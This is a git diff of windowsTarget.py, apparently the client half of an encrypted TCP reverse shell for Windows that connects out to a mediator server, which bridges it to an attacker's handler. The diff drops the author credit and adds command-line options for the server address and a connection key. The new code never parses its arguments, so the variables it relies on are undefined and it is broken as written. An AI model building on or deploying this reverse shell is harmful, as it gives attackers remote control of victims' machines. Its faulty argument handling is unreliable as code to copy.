@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
 Program: windowsTarget.py
-Author: C.J. May
-Description: Basic TCP reverse shell -- to be used with mediator.py server to be bridged to the reverse shell handler client connection
+Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell handler client connection
 """
 
+import argparse
 from Crypto.Cipher import AES
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -81,6 +81,13 @@ class WindowsRShell:
 
 
 if __name__ == "__main__":
-    rShell = WindowsRShell(mediatorHost="example.com")
+    parser = argparse.ArgumentParser(description="")
+    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
+    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
+                        default="example.com")
+    if connectionKey:
+        rShell = WindowsRShell(mediatorHost=serverAddr, connectionKey=connectionKey)
+    else:
+        rShell = WindowsRShell(mediatorHost=serverAddr)
     rShell.run()
 
